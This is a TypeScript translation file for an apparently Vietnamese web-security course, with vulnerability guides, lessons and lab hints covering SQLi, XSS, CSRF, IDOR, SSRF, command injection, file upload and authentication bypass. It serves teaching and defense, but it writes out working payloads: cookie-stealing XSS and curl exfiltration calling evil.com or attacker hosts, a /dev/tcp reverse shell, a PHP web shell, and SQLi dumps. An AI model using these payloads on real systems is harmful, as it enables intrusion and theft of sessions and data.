export const englishPaths: Record<string, { title: string; description: string }> = {
  "Nhập môn Bảo mật Web": {
    title: "Introduction to Web Security",
    description: "A pathway designed for absolute beginners. Learn the basic concepts of web security, common attack vectors, and defense strategies. You will learn to think like a hacker to better protect web applications."
  },
  "Kiểm thử xâm nhập Web nâng cao": {
    title: "Advanced Web Penetration Testing",
    description: "An intermediate pathway for those who have mastered the basics. Dive deep into complex exploitation techniques, bypassing security controls, and utilizing professional tools like Burp Suite and sqlmap."
  },
  "Chuyên gia Pentest & Bug Bounty": {
    title: "Pentest & Bug Bounty Expert",
    description: "An advanced pathway for those aspiring to become professional web pentesters or participate in bug bounty programs. Covers complex attack techniques, attack chains, and pentest methodologies."
  }
};

export const englishVulnerabilities: Record<string, { name: string; description: string; exploitationGuide: string; preventionGuide: string }> = {
  "sql-injection": {
    name: "SQL Injection (SQLi)",
    description: "SQL Injection allows attackers to execute arbitrary SQL statements in the application's database. It is one of the most critical and common vulnerabilities, potentially leading to data leakage, identity spoofing, or server takeover.",
    exploitationGuide: `# SQL Injection Exploitation Guide

## 1. Authentication Bypass
By injecting SQL payload into login forms:
\`\`\`sql
Username: admin' --
Password: any_password
\`\`\`
This comments out the password validation condition, letting you log in as admin.

## 2. Union-Based SQL Injection
Used to retrieve data from other tables using the UNION operator:
\`\`\`sql
' UNION SELECT null, username, password FROM users --
\`\`\`

## 3. Blind SQL Injection
Used when the application doesn't return data in the HTTP response:
- **Boolean-based**: Infer database characters by observing True/False changes in page response.
- **Time-based**: Inject commands like \`SLEEP(5)\` to verify characters based on response delay.`,
    preventionGuide: `# SQL Injection Prevention

## 1. Parameterized Queries (Prepared Statements)
Never concatenate user input directly into SQL commands. Always use parameterized queries:
\`\`\`java
String query = "SELECT * FROM users WHERE username = ? AND password = ?";
PreparedStatement pstmt = connection.prepareStatement(query);
pstmt.setString(1, username);
pstmt.setString(2, password);
ResultSet results = pstmt.executeQuery();
\`\`\`

## 2. Object Relational Mapping (ORM)
Use ORM frameworks like Hibernate, JPA, or Entity Framework which handle query parameterization automatically.

## 3. Input Validation & Whitelisting
Validate and sanitize all incoming parameters, ensuring they conform to expected formats.`
  },
  "xss": {
    name: "Cross-Site Scripting (XSS)",
    description: "XSS allows attackers to inject malicious scripts into web pages viewed by other users. This script runs in the user's browser, leading to session hijacking, defacement, or phishing.",
    exploitationGuide: `# Cross-Site Scripting (XSS) Exploitation

## 1. Reflected XSS
The payload is included in the HTTP request and reflected back in the immediate HTTP response:
\`\`\`
https://example.com/search?q=<script>alert('XSS')</script>
\`\`\`

## 2. Stored XSS
The payload is permanently stored in the database (e.g., in a comment or profile description) and executed when users view the page:
\`\`\`html
<script>fetch('http://evil.com/steal?cookie=' + document.cookie)</script>
\`\`\`

## 3. DOM-Based XSS
The payload is executed as a result of modifying the DOM environment directly in the browser:
\`\`\`javascript
document.getElementById("output").innerHTML = location.hash;
\`\`\``,
    preventionGuide: `# Cross-Site Scripting (XSS) Prevention

## 1. Output Encoding
Encode data before rendering it in the browser to prevent interpretation as executable script:
- HTML Entity Encoding (\`<\` to \`&lt;\`, \`>\` to \`&gt;\`)
- JavaScript Encoding
- URL Encoding

## 2. Content Security Policy (CSP)
Configure HTTP CSP headers to restrict resources (like JavaScript files) that the browser is allowed to load:
\`\`\`http
Content-Security-Policy: default-src 'self'; script-src 'self' https://trustedscripts.com;
\`\`\`

## 3. Use HttpOnly Flag for Cookies
Prevent client-side scripts from reading sensitive cookies (like session tokens) by setting the \`HttpOnly\` flag.`
  },
  "csrf": {
    name: "Cross-Site Request Forgery (CSRF)",
    description: "CSRF forces an authenticated end user to execute unwanted actions on a web application. It targets state-changing requests like password resets or money transfers.",
    exploitationGuide: `# Cross-Site Request Forgery (CSRF) Exploitation

## 1. How it works
1. Victim logs into \`bank.com\` and receives a session cookie.
2. Attacker tricks the victim into visiting \`evil.com\`.
3. \`evil.com\` contains a form targeting \`bank.com/transfer\`.
4. The browser automatically attaches the \`bank.com\` session cookie, making the unauthorized request succeed.

## 2. PoC Form Example
\`\`\`html
<form action="https://bank.com/transfer" method="POST" id="csrf-form">
  <input type="hidden" name="to" value="attacker_account">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.getElementById('csrf-form').submit();</script>
\`\`\``,
    preventionGuide: `# Cross-Site Request Forgery (CSRF) Prevention

## 1. CSRF Anti-Forgery Tokens
Use unique, unpredictable, and secret tokens associated with the user's current session. The server validates this token on state-changing requests:
\`\`\`html
<input type="hidden" name="_csrf" value="random_token_string">
\`\`\`

## 2. SameSite Cookie Attribute
Configure session cookies with the \`SameSite\` attribute set to \`Strict\` or \`Lax\` to prevent browsers from sending cookies on cross-site requests:
\`\`\`http
Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly
\`\`\`

## 3. Re-Authentication for Sensitive Actions
Force users to re-enter their password or complete an OTP code before executing critical transactions.`
  },
  "idor": {
    name: "Insecure Direct Object Reference (IDOR)",
    description: "IDOR occurs when an application provides direct access to objects based on user-supplied input, without validating if the user is authorized to access the requested resource.",
    exploitationGuide: `# IDOR Exploitation

## 1. Manipulating Resource IDs
Attackers inspect requests and modify parameters to view resources belonging to other users:
\`\`\`http
GET /api/invoices?id=1001  -> Victim's invoice
GET /api/invoices?id=1002  -> Target's invoice (Access IDOR)
\`\`\`

## 2. API Endpoint Fuzzing
Automating ID rotation to scrape sensitive details:
\`\`\`bash
ffuf -u https://target.com/api/users/FUZZ -w ids.txt
\`\`\``,
    preventionGuide: `# IDOR Prevention

## 1. Implement Robust Authorization Checks
Never rely on parameter obfuscation. Check if the authenticated user owns or is authorized to access the requested resource:
\`\`\`java
if (!invoice.getOwnerId().equals(currentUser.getId())) {
    throw new AccessDeniedException("Access Denied");
}
\`\`\`

## 2. Use Indirect Reference Maps
Map internal database IDs to random, temporary session-based strings so users cannot predict or guess other resource IDs.

## 3. Use Unpredictable Unique Identifiers (UUIDs)
Avoid sequential auto-incrementing integer IDs. Use random UUIDs (version 4) to make IDs unguessable.`
  },
  "ssrf": {
    name: "Server-Side Request Forgery (SSRF)",
    description: "SSRF allows an attacker to abuse server functionality to make requests to internal or external systems. Attackers target internal services, metadata APIs, or bypass firewalls.",
    exploitationGuide: `# Server-Side Request Forgery (SSRF) Exploitation

## 1. Accessing Internal Services
Force the server to fetch data from localhost or internal networks:
\`\`\`http
POST /api/preview
{"url": "http://127.0.0.1:8080/admin"}
\`\`\`

## 2. Cloud Instance Metadata Harvesting
Extract instance metadata and credentials from cloud providers:
- **AWS**: \`http://169.254.169.254/latest/meta-data/iam/security-credentials/\`
- **GCP**: \`http://metadata.google.internal/computeMetadata/v1/\`

## 3. Internal Port Scanning
Map open ports on internal hosts using the vulnerable server as a proxy.`,
    preventionGuide: `# Server-Side Request Forgery (SSRF) Prevention

## 1. Use Whitelisting for Target Destinations
Only allow connections to trusted domains and ports. Reject everything else.

## 2. Restrict Access to Internal Address Ranges
Explicitly block requests targeting private, loopback, or local IP spaces:
\`\`\`java
InetAddress address = InetAddress.getByName(host);
if (address.isLoopbackAddress() || address.isSiteLocalAddress()) {
    throw new SecurityException("Access to internal network is denied");
}
\`\`\`

## 3. Disable HTTP Redirections
Do not follow HTTP redirects automatically, as attackers can bypass filters by redirecting to internal hosts.

## 4. Run Services in Isolated Network Segments
Isolate the web server from private databases or administrative tools.`
  },
  "command-injection": {
    name: "Command Injection",
    description: "OS Command Injection occurs when an application executes system shell commands containing unvalidated user input, leading to remote code execution (RCE).",
    exploitationGuide: `# OS Command Injection Exploitation

## 1. Basic Command Chaining
Append malicious commands to legitimate input using shell separators:
\`\`\`bash
# Web application runs: ping <input>
Input: 127.0.0.1; whoami
Input: 127.0.0.1 && cat /etc/passwd
Input: 127.0.0.1 | ls -la
\`\`\`

## 2. Blind Command Injection
Use timing delays or out-of-band communication if output is not returned:
\`\`\`bash
Input: 127.0.0.1; sleep 10
Input: 127.0.0.1; curl http://attacker.com/$(whoami)
\`\`\``,
    preventionGuide: `# Command Injection Prevention

## 1. Avoid Executing Shell Commands
Always prefer native API methods or libraries over shell executables:
\`\`\`java
// ❌ Avoid shell calls
Runtime.getRuntime().exec("ping " + host);

// ✅ Use native library
InetAddress.getByName(host).isReachable(5000);
\`\`\`

## 2. Use Parameterized Process Execution
If executing external commands is mandatory, pass parameters as separate arguments rather than letting a shell interpret the string:
\`\`\`java
ProcessBuilder pb = new ProcessBuilder("ping", "-c", "4", host);
\`\`\`

## 3. Strictly Validate and Sanitize Inputs
Use white-list regular expressions to ensure inputs only contain expected safe characters.`
  },
  "file-upload": {
    name: "Unrestricted File Upload",
    description: "This vulnerability occurs when the application allows users to upload files without proper validation, enabling them to upload executable scripts (like web shells) and achieve remote code execution.",
    exploitationGuide: `# Unrestricted File Upload Exploitation

## 1. Uploading Web Shells
Upload a PHP script that accepts and executes shell commands:
\`\`\`php
<?php system($_GET['cmd']); ?>
\`\`\`
Then request: \`https://target.com/uploads/shell.php?cmd=id\`

## 2. Bypassing Extension Filters
- Alternative extensions: \`.php5\`, \`.phtml\`, \`.phar\`
- Double extension: \`shell.php.jpg\`
- Null byte bypass: \`shell.php%00.jpg\`

## 3. Manipulating Content-Type Header
Change request header during upload:
\`\`\`http
Content-Type: application/x-php -> Change to -> image/jpeg
\`\`\``,
    preventionGuide: `# Unrestricted File Upload Prevention

## 1. Whitelist Allowed Extensions
Only accept safe file extensions (e.g., \`jpg\`, \`png\`, \`pdf\`). Never use blacklists.

## 2. Validate File Content Type (MIME Type)
Verify the file content using content detection libraries (like Apache Tika) rather than trusting user-provided metadata.

## 3. Rename Uploaded Files
Rename files to random UUIDs upon receipt to prevent attackers from predicting the path of uploaded scripts.

## 4. Store Files Outside Web Root
Save files in an isolated storage server or outside the public web root directory, and serve them via a stream script with download headers.`
  },
  "auth-bypass": {
    name: "Authentication Bypass",
    description: "Authentication Bypass refers to flaws that allow attackers to access restricted areas of an application without providing valid authentication credentials.",
    exploitationGuide: `# Authentication Bypass Exploitation

## 1. Default/Weak Credentials
Inspect administrative entry points and try default keys:
\`\`\`
admin:admin
admin:password
root:root
\`\`\`

## 2. SQL Injection login bypass
Inject query terminators into credentials forms:
\`\`\`
Username: admin' --
Password: any
\`\`\`

## 3. JWT Manipulation
Modify header algorithm to \`none\`, remove signature, and change subject claims.`,
    preventionGuide: `# Authentication Bypass Prevention

## 1. Enforce Multi-Factor Authentication (MFA)
Ensure multi-factor authentication is required for all administrative access.

## 2. Strong Password Policies and Hashing
Mandate passwords containing upper, lower, numbers, and symbols. Hash passwords using \`bcrypt\` or \`Argon2\` with unique salts.

## 3. Implement Rate Limiting
Limit login attempts per IP address and account username to defend against brute-force attacks.`
  }
};

export const englishLessons: Record<string, { title: string; contentMarkdown: string; learningObjective: string }> = {
  "Giới thiệu về Bảo mật Web": {
    title: "Introduction to Web Security",
    learningObjective: "Understand the overview of web application security and the top 10 security risks according to OWASP Top 10.",
    contentMarkdown: `# Introduction to Web Security

## What is Web Security?
Web Security refers to the measures, protocols, and technologies designed to protect web applications, sites, and services from cyberattacks and security threats.

## Why is Web Security Important?
- **Protecting User Data**: Personal, financial, and medical information.
- **Regulatory Compliance**: GDPR, PCI DSS, and local Cybersecurity Laws.
- **Brand Reputation**: Security breaches can ruin customer trust.
- **Financial Protection**: The average cost of a data breach is millions of dollars.

## OWASP Top 10
OWASP (Open Web Application Security Project) publishes the list of the top 10 most critical web application security risks:
1. **Broken Access Control**
2. **Cryptographic Failures**
3. **Injection** (SQLi, XSS, etc.)
4. **Insecure Design**
5. **Security Misconfiguration**
6. **Vulnerable Components**
7. **Authentication Failures**
8. **Software Integrity Failures**
9. **Logging Failures**
10. **SSRF** (Server-Side Request Forgery)

## The Pentester Mindset
> "To secure a system, you must first understand how to attack it."

A good pentester needs:
- Creative thinking and persistence.
- Deep understanding of web technologies.
- Constant learning of new techniques.
- Ethical code of conduct.`
  },
  "HTTP và cách hoạt động của Web": {
    title: "HTTP and Web Operations",
    learningObjective: "Understand the Client-Server model, basic HTTP methods, Headers, and Session management mechanisms.",
    contentMarkdown: `# HTTP and Web Operations

## Client-Server Model
When you access a website:
1. **The Browser** (Client) sends an HTTP Request to the Server.
2. **The Server** processes the request and sends back an HTTP Response.
3. **The Browser** renders HTML/CSS/JS into a visible web page.

## HTTP Methods
| Method | Purpose | Example |
|--------|---------|---------|
| GET | Retrieve data | View a post, query an API |
| POST | Submit data | Login, submit forms |
| PUT | Replace resource | Edit profile fully |
| PATCH | Partial update | Update password |
| DELETE | Delete resource | Remove a comment |

## Important HTTP Headers
\`\`\`http
# Request Headers
Host: www.example.com
User-Agent: Mozilla/5.0
Cookie: session=abc123
Authorization: Bearer eyJhbG...

# Response Headers
Content-Type: application/json
Set-Cookie: session=abc123; HttpOnly; Secure
X-Content-Type-Options: nosniff
\`\`\`

## HTTP Status Codes
- **200 OK**: Success
- **301/302**: Redirect
- **400 Bad Request**: Client-side error
- **401 Unauthorized**: Authentication needed
- **403 Forbidden**: Access Denied
- **404 Not Found**: Resource not found
- **500 Internal Server Error**: Server-side error

## Cookies and Sessions
- **Cookie**: Small key-value data stored by the browser, sent in every request.
- **Session**: User data stored on the server, referenced by session ID in cookies.
- **JWT (JSON Web Token)**: Self-contained stateless token representing authentication claim.`
  },
  "SQL Injection cho người mới bắt đầu": {
    title: "SQL Injection for Beginners",
    learningObjective: "Understand basic SQL Injection mechanics and how attackers bypass login pages.",
    contentMarkdown: `# SQL Injection for Beginners

## What is SQL?
SQL (Structured Query Language) is the language used to interact with databases:
\`\`\`sql
SELECT * FROM users WHERE username = 'admin' AND password = '123456';
\`\`\`

## What is SQL Injection (SQLi)?
SQLi occurs when an application concatenates user inputs directly into SQL statements without sanitization:
\`\`\`java
// Vulnerable Implementation
String query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'";
\`\`\`
If the attacker inputs: \`admin' --\` as the username, the resulting query is:
\`\`\`sql
SELECT * FROM users WHERE username = 'admin' --' AND password = '';
\`\`\`
The rest of the query is ignored as a comment (\`--\`), bypassing password validation!

## Basic Exploitation Steps

### Step 1: Detection
Insert a single quote (\`'\`) into inputs. If a database error occurs, SQL Injection might be present.

### Step 2: Verification
Try testing with logical conditions:
\`\`\`
Input: ' OR '1'='1
Resulting query condition is always true.
\`\`\`

### Step 3: Exploitation
Use UNION operators to retrieve database structure and columns:
\`\`\`sql
' UNION SELECT 1, username, password FROM users --
\`\`\``
  },
  "Cross-Site Scripting (XSS) cơ bản": {
    title: "Basic Cross-Site Scripting (XSS)",
    learningObjective: "Differentiate between 3 types of XSS (Reflected, Stored, DOM), their impact, and basic prevention.",
    contentMarkdown: `# Basic Cross-Site Scripting (XSS)

## What is XSS?
XSS enables attackers to inject client-side scripts (usually JavaScript) into web pages viewed by other users.

## The 3 Types of XSS

### 1. Reflected XSS
The malicious script is reflected off the web server in an immediate response:
\`\`\`
https://example.com/search?q=<script>alert('XSS')</script>
\`\`\`

### 2. Stored XSS
The script is saved permanently in the server's database (e.g., in blog comments, user bio, or profile details):
\`\`\`html
<script>fetch('http://evil.com/steal?cookie=' + document.cookie)</script>
\`\`\`

### 3. DOM-Based XSS
The execution of the vulnerability is entirely within the DOM and executed client-side:
\`\`\`javascript
// Vulnerable client script
document.getElementById('output').innerHTML = location.hash;
\`\`\`

## Common Impacts of XSS
- Stealing cookies and hijacking sessions.
- Defacing website layouts.
- Capturing user input (keylogging).

## Basic Remediation
1. **Output Encoding**: Convert unsafe HTML characters (e.g. \`<\` to \`&lt;\`).
2. **HttpOnly Flag**: Mark cookies as HttpOnly to block access via JavaScript.`
  },
  "CSRF và bảo vệ form": {
    title: "CSRF and Form Protection",
    learningObjective: "Understand Cross-Site Request Forgery (CSRF) attacks and token prevention mechanisms.",
    contentMarkdown: `# Cross-Site Request Forgery (CSRF)

## How CSRF Works
1. Victim authenticates to \`bank.com\` and receives a session cookie.
2. Victim visits an attacker-controlled site (\`evil.com\`).
3. The malicious site issues a request to \`bank.com/transfer\` in the background.
4. The browser automatically sends the \`bank.com\` cookies, causing the transaction to execute.

## Attack Example
\`\`\`html
<!-- Hidden form on malicious page -->
<form action="https://bank.com/transfer" method="POST" id="evil-form">
    <input type="hidden" name="to" value="attacker">
    <input type="hidden" name="amount" value="5000">
</form>
<script>document.getElementById('evil-form').submit();</script>
\`\`\`

## Preventing CSRF

### 1. CSRF Anti-Forgery Tokens
Generate a unique, unpredictable token for each user session, embedded inside forms and validated on the server.

### 2. SameSite Cookie Attribute
Configure cookies to prevent cross-site inclusion:
\`\`\`http
Set-Cookie: session=abc; SameSite=Lax; Secure
\`\`\``
  },
  "Kỹ thuật khai thác SQL Injection nâng cao": {
    title: "Advanced SQL Injection Exploitation",
    learningObjective: "Master Blind SQL Injection (Boolean-based, Time-based) and Union-based exploitation techniques.",
    contentMarkdown: `# Advanced SQL Injection Exploitation

## Union-Based SQL Injection
Requires joining query tables with the same number and types of columns:
\`\`\`sql
' ORDER BY 1 --
' ORDER BY 2 -- -> error means there is 1 column
' UNION SELECT username, password FROM users --
\`\`\`

## Blind SQL Injection
Used when the application doesn't return data output, but only changes state or delays execution.

### 1. Boolean-Based
Guess database schema characters using true/false logic queries:
\`\`\`sql
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' --
\`\`\`

### 2. Time-Based
Use functions like \`sleep()\` or \`pg_sleep()\` to trigger conditional processing delays:
\`\`\`sql
' AND IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0) --
\`\`\`

## Automated SQL Injection Tools (sqlmap)
\`\`\`bash
sqlmap -u "https://target.com/item.php?id=1" --dbs
sqlmap -u "https://target.com/item.php?id=1" --tables
sqlmap -u "https://target.com/item.php?id=1" -T users --dump
\`\`\``
  },
  "IDOR - Truy cập trái phép dữ liệu": {
    title: "IDOR - Insecure Direct Object References",
    learningObjective: "Understand Insecure Direct Object Reference (IDOR) vulnerabilities and how to test for them.",
    contentMarkdown: `# IDOR - Insecure Direct Object References

## Understanding IDOR
IDOR happens when an application gives access to direct database objects or files without verifying if the user has permissions:
\`\`\`http
GET /api/invoices/2001  -> Your invoice
GET /api/invoices/2002  -> Target invoice (Bypasses verification)
\`\`\`

## Common IDOR Locations
- URL Parameters (\`/profile?user_id=123\`)
- JSON Request bodies (\`{"account_id": 999}\`)
- Headers or Cookies (\`X-User-Id: 123\`)

## Testing for IDOR
1. Register two different accounts (Account A and Account B).
2. Intercept a request from Account A in Burp Suite.
3. Modify the ID parameters to match Account B's ID.
4. Check if Account A can view or edit B's resources.

## Mitigation
Ensure server-side logic validates ownership mapping before processing:
\`\`\`java
Invoice invoice = repo.findById(id);
if (!invoice.getOwnerId().equals(currentUser.getId())) {
    throw new ForbiddenException("Access Denied");
}
\`\`\``
  },
  "SSRF - Tấn công máy chủ gián tiếp": {
    title: "SSRF - Server-Side Request Forgery",
    learningObjective: "Explore SSRF (Server-Side Request Forgery) vulnerabilities, filter bypass techniques, and remediation.",
    contentMarkdown: `# Server-Side Request Forgery (SSRF)

## How SSRF Works
SSRF allows an attacker to manipulate server-side API requests to target internal services or backend infrastructures:
\`\`\`
Attacker -> Vulnerable Endpoint (URL param) -> Server -> Internal Host (AWS Metadata)
\`\`\`

## High-Risk Features
- URL previews
- External image imports or resizing
- Webhook endpoints
- PDF generators from URLs

## Typical Targets
- **Local services**: \`http://127.0.0.1:8080/admin\`
- **AWS Instance Metadata**: \`http://169.254.169.254/latest/meta-data/\`

## Filter Bypasses
- Decimal/Octal encoding: \`http://2130706433\` instead of \`http://127.0.0.1\`
- DNS Rebinding: Register domain pointing to local network interface IP.`
  },
  "Command Injection - Thực thi lệnh hệ thống": {
    title: "Command Injection - Operating System Command Execution",
    learningObjective: "Understand OS Command Injection mechanics, blind exploitation techniques, and defense.",
    contentMarkdown: `# Command Injection - Operating System Command Execution

## Introduction
OS Command Injection occurs when an application executes system commands containing unsanitized input parameters:
\`\`\`java
// Vulnerable command execution
String host = request.getParameter("host");
Runtime.getRuntime().exec("ping -c 4 " + host);
\`\`\`
If input is: \`8.8.8.8; whoami\`, the server executes both command strings!

## Shell Separators
- \`;\` and \`\\n\`: Execute next command sequentially.
- \`&\` and \`&&\`: Execute concurrently or conditionally.
- \`|\` and \`||\`: Pipe stdout or handle exit failures.
- \`$(cmd)\` and \`\`\`cmd\`\`\`: Command substitution.

## Reverse Shell Connection
Spawns a shell pipeline from the target back to the attacker's terminal listener:
\`\`\`bash
bash -i >& /dev/tcp/attacker_ip/4444 0>&1
\`\`\``
  },
  "File Upload - Tải lên tệp không giới hạn": {
    title: "File Upload - Unrestricted File Upload",
    learningObjective: "Understand the risks of file upload features, extension whitelist bypasses, and secure implementation.",
    contentMarkdown: `# File Upload - Unrestricted File Upload

## Risks
- Uploading a Web Shell results in Remote Code Execution (RCE).
- Uploading scripts (HTML/SVG) leads to Stored XSS.
- Large files can exhaust server disk space (DoS).

## Example Web Shells
\`\`\`php
<?php system($_GET['cmd']); ?>
\`\`\`
Request path: \`/uploads/shell.php?cmd=whoami\`

## Common Bypass Techniques
- Alternate Extensions: \`shell.phtml\`, \`shell.php5\`
- Double Extensions: \`shell.php.jpg\`
- Header Spoofing: Set \`Content-Type: image/jpeg\`
- Magic Bytes Spoofing: Prepend file with \`GIF89a\` header.`
  },
  "Authentication Bypass - Bỏ qua xác thực": {
    title: "Authentication Bypass",
    learningObjective: "Explore login bypass techniques, authentication logic flaws, and JWT security.",
    contentMarkdown: `# Authentication Bypass

## Introduction
Authentication bypass allows attackers to access protected pages without providing valid login details.

## Attack Vectors
- **Default/Weak Credentials**: Checking for keys like \`admin:admin\`.
- **SQLi Login Bypass**: Entering payloads into password fields: \`admin' --\`.
- **JWT Alg None Attack**: Deleting the signature and setting algorithm claim to \`none\`.
- **Session Hijacking**: Spoofing cookie session identifiers.`
  },
  "Bypass WAF và Security Controls": {
    title: "Bypass WAF and Security Controls",
    learningObjective: "Learn techniques to bypass Web Application Firewalls (WAF) and common input filtration mechanisms.",
    contentMarkdown: `# Bypass WAF and Security Controls

## What is a WAF?
A Web Application Firewall (WAF) inspects incoming requests and blocks malicious patterns (such as SQLi or XSS payloads).

## Common Bypass Tactics
- **Obfuscation**: Using alternative encodings (URL encoding, double encoding, Hex encoding).
- **Whitespace Bypass**: Using comments (\`/**/\`) instead of spaces.
- **SQL Dialect Features**: Using less common functions or syntax that the WAF doesn't check.
- **Payload Splitting**: Dividing strings using concatenation or logical operators.`
  },
  "Attack Chains - Chuỗi khai thác lỗ hổng": {
    title: "Attack Chains - Vulnerability Exploitation Chains",
    learningObjective: "Learn to combine multiple minor vulnerabilities into exploitation chains (attack chains) to takeover systems.",
    contentMarkdown: `# Attack Chains - Vulnerability Exploitation Chains

## Concept
An Attack Chain combines multiple separate, low-severity vulnerabilities to achieve a high-impact compromise.

## Example Chain: XSS to RCE
1. Attacker finds a Stored XSS on a public forum.
2. Attacker crafts a payload that executes an API request to create a new user when an admin views the thread.
3. Attacker logs in using the newly created admin account.
4. Using administrative tools, the attacker uploads a web shell to achieve Remote Code Execution.`
  },
  "Bug Bounty Methodology - Phương pháp săn lỗi": {
    title: "Bug Bounty Methodology",
    learningObjective: "Equip yourself with practical vulnerability hunting methodologies, professional reporting, and bug bounty workflows.",
    contentMarkdown: `# Bug Bounty Methodology

## Workflow Phases

### Phase 1: Reconnaissance
- Domain mapping and subdomain enumeration: \`subfinder\`, \`amass\`
- Tech stack analysis: \`wappalyzer\`, \`whatweb\`
- Directory brute forcing: \`gobuster\`, \`dirsearch\`

### Phase 2: Active Testing
- Analysing APIs and inputs.
- Manual verification of parameters.

### Phase 3: Reporting
- Write a professional report containing a description, steps to reproduce, impact assessment, and remediation suggestions.`
  }
};

export const englishLabs: Record<string, { title: string; description: string; hints: string[] }> = {
  "SQL Injection - Đăng nhập Admin": {
    title: "SQL Injection - Admin Login Bypass",
    description: "Bypass login page using SQL Injection. Goal: Login as admin without knowing the password. The application uses unsafe direct SQL query string concatenation.",
    hints: [
      "Try injecting a single quote (') into the username field",
      "Use the payload: admin' -- to comment out the password validation",
      "Full payload: admin' OR '1'='1' --"
    ]
  },
  "SQL Injection - Trích xuất dữ liệu với UNION": {
    title: "SQL Injection - UNION Data Extraction",
    description: "Leverage UNION-based SQL Injection to extract list of usernames and passwords from the database. The product search feature is vulnerable.",
    hints: [
      "Find the number of columns using ORDER BY",
      "Use UNION SELECT to combine results",
      "Query information_schema.tables to find table names",
      "SELECT username, password FROM users"
    ]
  },
  "Blind SQL Injection - Trích xuất từng ký tự": {
    title: "Blind SQL Injection - Character Extraction",
    description: "Exploit Blind SQL Injection where query results are not directly displayed. Use boolean-based or time-based techniques to extract the admin password character by character.",
    hints: [
      "Observe response differences between true and false query conditions",
      "Use SUBSTRING() to extract individual characters",
      "Try time-based payloads: IF(condition, SLEEP(5), 0)",
      "Or leverage sqlmap to automate the process"
    ]
  },
  "Reflected XSS - Tìm kiếm": {
    title: "Reflected XSS - Search Feature",
    description: "Discover and exploit a Reflected Cross-Site Scripting (XSS) vulnerability in the search function. Goal: Execute alert(document.domain) successfully.",
    hints: [
      "Input <script>alert(1)</script> in search input",
      "If filtered, try: <img src=x onerror=alert(1)>",
      "Inspect source code to see how user input is rendered in the page"
    ]
  },
  "Stored XSS - Đánh cắp Cookie": {
    title: "Stored XSS - Cookie Hijacking",
    description: "Exploit Stored XSS in the comments system to hijack the admin's session cookie. Goal: Send the admin cookie back to your listener server.",
    hints: [
      "Post a comment containing script tag",
      "Use fetch() or new Image() to exfiltrate cookie",
      "Payload: <script>new Image().src='http://your-server/?c='+document.cookie</script>",
      "The administrator's cookie contains the flag"
    ]
  },
  "CSRF - Thay đổi email người dùng": {
    title: "CSRF - Change User Email",
    description: "Create a malicious webpage to change a user's email address without their consent. The target application lacks CSRF protection.",
    hints: [
      "Create an HTML page with a hidden form pointing to the email update endpoint",
      "Make the form automatically submit on page load",
      "Use <body onload='document.forms[0].submit()'>"
    ]
  },
  "IDOR - Xem hồ sơ người dùng khác": {
    title: "IDOR - View Other User Profiles",
    description: "Exploit IDOR to access personal details of other users. The API uses sequential IDs and lacks ownership checks.",
    hints: [
      "Log in and inspect the URL when viewing your own profile",
      "Change the user ID in the URL parameter",
      "Try user IDs from 1 to 10",
      "One of the profiles contains the flag"
    ]
  },
  "IDOR - Thay đổi vai trò người dùng": {
    title: "IDOR - User Role Escalation",
    description: "Exploit IDOR in the profile update API to escalate privilege from user to administrator. Goal: Access the admin dashboard page.",
    hints: [
      "Intercept the profile update request in Burp Suite",
      "Inject a 'role' field into the request JSON payload",
      "Try role: 'admin'",
      "After escalation, navigate to /admin/dashboard"
    ]
  },
  "SSRF - Đọc file nội bộ": {
    title: "SSRF - Read Local Files",
    description: "Exploit SSRF in the URL preview feature to read local files and access hidden internal services. The app allows users to input any URL to preview content.",
    hints: [
      "Try entering http://localhost or http://127.0.0.1",
      "Try scanning common internal ports like 3000, 8080, 6379",
      "Use file:///etc/passwd to read local files",
      "Identify which internal service contains the flag"
    ]
  },
  "Command Injection - Ping Tool": {
    title: "OS Command Injection - Ping Tool",
    description: "Exploit OS Command Injection in the online ping tool. The application allows users to input an IP address but fails to sanitize the shell inputs.",
    hints: [
      "Try adding a semicolon (;) after the IP address",
      "Payload: 127.0.0.1; cat /flag.txt",
      "If semicolon is filtered, try || or &&",
      "The flag is located in /flag.txt on the server"
    ]
  },
  "Blind Command Injection": {
    title: "Blind OS Command Injection",
    description: "Exploit Blind Command Injection where command execution output is not returned to the web interface. Use out-of-band or timing delays to confirm.",
    hints: [
      "Output is hidden - try time-based logic: ; sleep 5",
      "If response is delayed by 5 seconds, Command Injection is confirmed!",
      "Use curl/wget to send data to your server",
      "Payload: ; curl http://your-server/$(cat /flag.txt)"
    ]
  },
  "File Upload - Bypass Extension Filter": {
    title: "File Upload - Bypass Extension Filter",
    description: "Upload a web shell to the server by bypassing file extension validation. The app only validates extension client-side and does basic MIME verification.",
    hints: [
      "Try changing file extension: .php to .php5 or .phtml",
      "Use Burp Suite to modify the Content-Type header during upload",
      "Change Content-Type to image/jpeg while keeping PHP code",
      "Try double extensions: shell.php.jpg"
    ]
  },
  "Authentication Bypass - JWT None Algorithm": {
    title: "Authentication Bypass - JWT None Algorithm",
    description: "Exploit JWT algorithm signature validation weakness. The server fails to validate algorithm properly, allowing token spoofing via the 'none' algorithm.",
    hints: [
      "Decode the current JWT token (jwt.io)",
      "Change header alg to 'none'",
      "Change payload role to 'admin'",
      "Reassemble and send the token without signature"
    ]
  },
  "Authentication Bypass - Brute Force Login": {
    title: "Authentication Bypass - Brute Force Login",
    description: "Find the admin credentials using brute force. The application lacks rate limiting or account lockout. Use common password wordlists to log in.",
    hints: [
      "Default username is usually 'admin'",
      "Use Burp Suite Intruder or Hydra tool",
      "Try top 100 common passwords",
      "The password is included in the top 1000 rockyou list"
    ]
  }
};
